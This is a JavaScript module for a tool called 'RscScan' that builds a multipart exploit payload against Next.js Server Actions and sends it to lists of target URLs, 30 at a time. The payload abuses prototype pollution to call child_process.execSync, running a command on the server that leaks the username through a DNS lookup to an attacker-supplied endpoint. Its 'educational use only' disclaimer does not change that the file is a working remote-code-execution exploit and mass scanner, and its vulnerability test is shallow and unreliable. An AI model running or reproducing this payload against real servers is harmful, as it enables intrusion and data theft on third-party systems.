import axios from 'axios'

/**
 * RscScan Service
 * 
 * This service replicates the Python scanner's functionality for educational purposes.
 * It builds the exploit payload and sends requests to target URLs.
 * 
 * IMPORTANT: This is for EDUCATIONAL USE ONLY. Only use on systems you own or have
 * explicit written permission to test.
 */

/**
 * Build the RscScan exploit payload
 * 
 * This payload exploits a prototype pollution vulnerability in Next.js Server Actions
 * that can lead to Remote Code Execution (RCE).
 * 
 * @param {string} dnsEndpoint - DNS exfiltration endpoint (e.g., Burp Collaborator)
 * @returns {string} - Multipart form data payload
 */
export function buildPayload(dnsEndpoint) {
    const boundary = '----WebKitFormBoundaryx8jO2oVc6SWP3Sad'

    const payload = [
        `--${boundary}`,
        'Content-Disposition: form-data; name="0"',
        '',
        `{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,` +
        `"value":"{\\"then\\":\\"$B1337\\"}",` +
        `"_response":{"_prefix":"process.mainModule.require('child_process').execSync('nslookup \`whoami\`.${dnsEndpoint}');",` +
        `"_formData":{"get":"$1:constructor:constructor"}}}`,
        `--${boundary}`,
        'Content-Disposition: form-data; name="1"',
        '',
        '"$@0"',
        `--${boundary}--`,
        ''
    ].join('\r\n')

    return payload
}

/**
 * Get HTTP headers for the exploit request
 * 
 * Note: User-Agent header is removed because browsers block it.
 * For full functionality, use the Electron desktop version.
 * 
 * @returns {Object} - Headers object
 */
export function getHeaders() {
    return {
        // User-Agent is removed here to prevent "Refused to set unsafe header" error.
        // It is injected by the Electron main process (main.cjs) via onBeforeSendHeaders.
        // 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/142.0.0.0 Safari/537.36',
        'Next-Action': 'x',
        'Content-Type': 'multipart/form-data; boundary=----WebKitFormBoundaryx8jO2oVc6SWP3Sad'
    }
}

/**
 * Scan a single target URL
 * 
 * @param {string} url - Target URL to scan
 * @param {string} payload - Exploit payload
 * @param {boolean} demoMode - Whether to use demo mode (simulated)
 * @returns {Promise<Object>} - Scan result object
 */
export async function scanTarget(url, payload, options = {}) {
    const { demoMode = false, timeout = 10000 } = options

    // Demo mode - simulate response without making real requests
    if (demoMode) {
        return new Promise((resolve) => {
            setTimeout(() => {
                const isVulnerable = Math.random() > 0.7 // 30% vulnerable rate in demo
                const statusCode = isVulnerable ? 200 : [404, 403, 500][Math.floor(Math.random() * 3)]

                resolve({
                    url,
                    status: isVulnerable ? 'vulnerable' : 'safe',
                    statusCode,
                    size: Math.floor(Math.random() * 10000) + 500,
                    message: isVulnerable
                        ? 'Potential vulnerability detected - DNS callback expected'
                        : 'No vulnerability indicators found',
                    headers: isVulnerable ? { 'x-action': 'revalidate', 'rsc': '1' } : {},
                    timestamp: new Date().toISOString()
                })
            }, Math.random() * 1000 + 500) // Random delay 500-1500ms
        })
    }

    // Real scanning mode
    try {
        const response = await axios.post(url, payload, {
            headers: getHeaders(),
            timeout, // Use configured timeout
            validateStatus: () => true, // Accept all status codes
            maxRedirects: 0
        })

        // Check for vulnerability indicators
        const vulnerabilityIndicators = ['x-action', 'next-action', 'rsc']
        const foundIndicators = vulnerabilityIndicators.filter(
            header => response.headers[header]
        )

        const isVulnerable = foundIndicators.length > 0

        return {
            url,
            status: isVulnerable ? 'vulnerable' : 'safe',
            statusCode: response.status,
            size: response.data?.length || 0,
            message: isVulnerable
                ? `Vulnerability indicators found: ${foundIndicators.join(', ')}`
                : 'No vulnerability indicators detected',
            headers: foundIndicators.reduce((acc, header) => {
                acc[header] = response.headers[header]
                return acc
            }, {}),
            timestamp: new Date().toISOString()
        }
    } catch (error) {
        // Detect CORS errors
        let errorMessage = error.message || 'Request failed'

        if (error.message?.includes('CORS') || error.code === 'ERR_NETWORK') {
            errorMessage = '⚠️ CORS blocked - Use Electron desktop app for real scanning'
        } else if (error.code === 'ECONNABORTED') {
            errorMessage = 'Request timeout'
        }

        return {
            url,
            status: 'error',
            statusCode: null,
            size: null,
            message: errorMessage,
            headers: {},
            timestamp: new Date().toISOString()
        }
    }
}

/**
 * Scan multiple targets with concurrency control
 * 
 * Replicates the Python script's ThreadPoolExecutor with max_workers=30
 * 
 * @param {Array<string>} targets - Array of target URLs
 * @param {string} dnsEndpoint - DNS exfiltration endpoint
 * @param {Function} onProgress - Progress callback function
 * @param {boolean} demoMode - Whether to use demo mode
 * @returns {Promise<Array>} - Array of scan results
 */
export async function scanMultiple(targets, dnsEndpoint, onProgress, options = {}) {
    const { demoMode = false, maxConcurrent = 30, timeout = 10000 } = options
    const payload = buildPayload(dnsEndpoint)
    const results = []

    let completed = 0
    const total = targets.length

    // Process targets in batches
    for (let i = 0; i < targets.length; i += maxConcurrent) {
        const batch = targets.slice(i, i + maxConcurrent)

        const batchPromises = batch.map(async (url) => {
            const result = await scanTarget(url, payload, { demoMode, timeout })
            completed++

            // Update progress
            if (onProgress) {
                onProgress({
                    current: completed,
                    total,
                    percentage: (completed / total) * 100
                })
            }

            return result
        })

        const batchResults = await Promise.all(batchPromises)
        results.push(...batchResults)
    }

    return results
}

/**
 * Calculate statistics from scan results
 * 
 * @param {Array} results - Array of scan results
 * @returns {Object} - Statistics object
 */
export function calculateStatistics(results) {
    return {
        total: results.length,
        success: results.filter(r => r.status === 'vulnerable').length,
        failed: results.filter(r => r.status === 'safe').length,
        warning: results.filter(r => r.status === 'error').length
    }
}
